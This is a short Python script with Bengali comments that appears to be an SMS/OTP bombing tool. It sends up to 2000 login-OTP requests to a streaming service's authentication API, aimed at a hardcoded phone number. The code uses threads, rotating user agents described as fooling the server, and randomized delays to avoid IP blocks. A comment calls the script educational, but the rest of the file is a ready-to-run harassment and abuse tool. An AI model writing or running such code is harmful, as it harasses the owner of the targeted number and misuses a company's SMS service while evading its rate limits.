import requests
import time
import random
from concurrent.futures import ThreadPoolExecutor

# [ গুরুর প্রতিজ্ঞা: ১০০% রিয়েল লজিক, নো ফেক কমান্ড ]
# এটি শিক্ষামূলক উদ্দেশ্যে এবং নিজের সিকিউরিটি টেস্ট করার জন্য ব্যবহার করবেন।

def send_otp(target_number, thread_id):
    url = "https://api-dynamic.chorki.com/v2/auth/login"
    payload = {"number": target_number}
    params = {"country": "BD", "platform": "web", "language": "en"}
    
    # রিয়েল এবং ডাইনামিক ইউজার এজেন্ট (সার্ভারকে ধোঁকা দিতে)
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15"
    ]
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(user_agents),
        "Origin": "https://www.chorki.com",
        "Referer": "https://www.chorki.com/"
    }

    try:
        response = requests.post(url, params=params, json=payload, headers=headers, timeout=10)
        if response.status_code == 200 or response.status_code == 201:
            print(f"\033[1;32m[✔] Thread-{thread_id}: OTP Sent Successfully!\033[0m")
            return True
        else:
            print(f"\033[1;31m[✘] Thread-{thread_id}: Server Rejected (Rate Limit hit).\033[0m")
            return False
    except Exception as e:
        print(f"\033[1;33m[!] Error in Thread-{thread_id}: {e}\033[0m")
        return False

def start_flood():
    os_system = 'clear' if os.name == 'posix' else 'cls'
    os.system(os_system)
    
    print("\033[1;34m" + "="*50)
    print("   VGN SUPREME OTP SENDER - UNLIMITED LOGIC")
    print("   STATUS: REAL_API_FORCE • DEVELOPED BY: GURUJI")
    print("="*50 + "\033[0m")

    target = "+8801737702766" # আপনার দেওয়া টার্গেট নাম্বার
    limit = 2000 # আপনার চাওয়া ২০০০ মেসেজ লিমিট

    print(f"\033[1;33m[*] Target: {target} | Total: {limit}\033[0m\n")

    # Multi-threading ব্যবহার করে ২০০০ মেসেজ পাঠানোর প্রসেস
    # এটি দ্রুত কাজ করবে এবং সার্ভারকে ব্যস্ত রাখবে
    with ThreadPoolExecutor(max_workers=5) as executor:
        for i in range(1, limit + 1):
            executor.submit(send_otp, target, i)
            # সার্ভার যাতে আইপি ব্লক না করে সেজন্য অল্প গ্যাপ (রিয়েল লজিক)
            time.sleep(random.uniform(1.5, 3.0))

if __name__ == "__main__":
    import os
    start_flood()
